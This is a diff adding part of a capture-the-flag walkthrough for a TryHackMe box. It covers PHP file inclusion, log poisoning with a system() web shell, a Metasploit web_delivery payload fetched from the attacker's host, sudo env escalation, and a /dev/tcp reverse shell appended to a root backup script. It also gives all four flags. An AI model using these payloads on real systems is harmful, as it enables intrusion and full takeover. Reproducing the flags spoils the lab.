@@ -131,3 +131,94 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 ```
+
+So after some more Recon I run gobuster again with
+```
+gobuster dir -u http://10.10.254.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
+```
+
+And got this
+```
+/flag.php             (Status: 200) [Size: 0]
+```
+So, as before I used this
+`http://10.10.254.194/?view=php://filter/convert.base64-encode/resource=dog/../flag`
+and got this
+`PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=`
+which translated into this
+```
+<?php
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+?>
+```
+So I got my first flag
+
+Ok to move from here it was so tough! I was trying to find a way to make the reverse shell happen.
+So finally I found online this:
+First I capture the request to `/?view=cat/../../../../../../var/log/apache2/access.log&ext=`
+Inside the User-Agent I paste a reverse-shell command
+```
+<?php system($_GET['cmd']);?>
+```
+I forward this and then I can search with it like
+```
+/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
+```
+
+Finally with Metasploit
+```
+use exploit/multi/script/web_delivery
+set target 1
+set lhost [local ip]
+set srvport 8081
+set payload php/meterpreter/reverse_tcp
+exploit
+```
+
+And metasploit returns a php command
+```
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://[local ip]:8081/FnR4n3ZI', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+```
+
+If I paste this in the end of my websearch I get this
+```
+http://10.10.99.45/?view=cat/../../../../../../../var/log/apache2/access.log&ext=&cmd=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://[local ip]:8081/FnR4n3ZI%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22
+```
+
+And I get a meterpreter session!
+Then I spawn a `shell` and make it stable with `/bin/sh -i`
+1 folder above I get the second flag
+`flag2_QMW7JvaY2LvK.txt` with `THM{LF1_t0_RC3_aec3fb}`
+
+## Priv Esc
+
+With sudo -l I get
+```
+Matching Defaults entries for www-data on 1b595fbfbd65:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 1b595fbfbd65:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+I search in GTFO bin for env_reset and get
+```
+sudo env /bin/sh
+```
+And I am root!
+I find my third flag under `/root` : `THM{D1ff3r3nt_3nv1ronments_874112}`
+
+Finally after some search around I found `/opt/backups`
+backup.sh was
+```
+tar cf /root/container/backup/backup.tar /root/container
+```
+
+So I found this online
+```
+echo "/bin/bash -c 'bash -i >& /dev/tcp/[local ip]/1234 0>&1'" >> backup.sh
+
+```
+
+And by opening a netcat connection and executing this command I was root on my new terminal and found flag4
+`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
